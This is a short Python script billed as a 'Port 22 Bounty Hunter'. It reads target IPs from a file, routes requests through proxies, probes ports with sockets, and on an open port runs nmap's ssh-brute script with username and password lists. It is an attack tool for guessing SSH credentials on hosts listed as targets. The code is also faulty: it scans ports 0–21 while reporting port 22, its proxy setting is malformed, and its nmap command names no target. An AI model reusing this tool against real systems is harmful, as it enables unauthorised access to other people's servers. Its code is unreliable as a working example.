import time
import nmap
import requests
import socket
import sys
import subprocess
import itertools
import threading
from datetime import datetime

subprocess.call('clear', shell=True)
nm = nmap.PortScanner()
ips = open('targets.txt')
with open('proxyf.txt', 'r') as f:
    proxy = f.read().splitlines()
proxies = {
    'http': (proxy,)
}

Corexital = False
t1 = datetime.now()
print("CURRENT TIME", t1)
print('Corexital Data: Port 22 Bounty Hunter Written by Derek Johnston')
def startintro():

    for c in itertools.cycle(['*', '**', '***', '****']):
        if Corexital:
            break
        sys.stdout.write('\rSTARTING ' + c)
        sys.stdout.flush()
        time.sleep(0.1)


t = threading.Thread(target=startintro)
t.start()


time.sleep(3)
Corexital = True


print("===============LETS ESTABLISH A SECURE SHELL===============")
def attack():
    x = ips.readline()
    print('Scanning:', x)
    try:
        for port in range(22):
            requests.get(url='https://google.com', proxies=proxies)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(2)
            result = sock.connect_ex((x, port))
            if result == 0:
                print("Port 22:OPEN")
                subprocess.call('nmap -p 22 --script ssh-brute --script-args userdb=names.txt,passdb=passes.txt')
            else:
                print("Port 22:CLOSED")
            sock.close()

    except KeyboardInterrupt:
        print("Cancelled")
        sys.exit()
    except socket.gaierror:
        print("Host Can't Resolve Man")

    except socket.error:
        print("Can't Connect Dude")


attack()
print("Attack Stopped At:", t1)
